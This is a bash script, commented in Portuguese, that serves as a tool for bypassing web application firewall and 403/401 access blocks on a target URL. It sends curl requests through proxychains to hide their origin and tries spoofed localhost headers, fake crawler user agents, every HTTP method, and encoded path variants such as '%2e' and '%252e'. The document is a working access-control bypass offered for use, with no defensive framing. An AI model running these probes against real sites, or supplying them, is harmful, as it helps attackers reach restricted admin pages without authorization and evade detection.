#!/bin/bash
# Bypass WAF/403/401 - Acesso Negado
echo "=== BYPASS WAF/403/401 ==="

# Headers bypass
HEADERS=(
    "X-Originating-IP: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Cluster-Client-IP: 127.0.0.1"
)

# User agents bypass
UA_LIST=(
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"
    "curl/7.68.0"
)

if [ -z "$1" ]; then
    echo "Uso: $0 <URL>"
    echo "Exemplo: $0 https://target.com/admin"
    exit 1
fi

URL="$1"
echo "Testando bypass para: $URL"

# Teste 1: Headers bypass
echo -e "\n[1] Testando headers bypass..."
for header in "${HEADERS[@]}"; do
    echo "Testando: $header"
    proxychains4 -q curl -s -o /dev/null -w "%{http_code}" -H "$header" "$URL"
    echo ""
done

# Teste 2: User-Agent bypass
echo -e "\n[2] Testando User-Agent bypass..."
for ua in "${UA_LIST[@]}"; do
    echo "Testando UA: ${ua:0:50}..."
    proxychains4 -q curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: $ua" "$URL"
    echo ""
done

# Teste 3: Method bypass
echo -e "\n[3] Testando métodos HTTP..."
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
    echo "Método $method:"
    proxychains4 -q curl -s -o /dev/null -w "%{http_code}" -X "$method" "$URL"
    echo ""
done

# Teste 4: Path bypass
echo -e "\n[4] Testando path bypass..."
PATHS=(
    "$URL/"
    "$URL/."
    "$URL/./"
    "$URL/../"
    "$URL/?"
    "$URL/#"
    "$URL/%2e/"
    "$URL/%252e/"
)

for path in "${PATHS[@]}"; do
    echo "Path: $path"
    proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$path"
    echo ""
done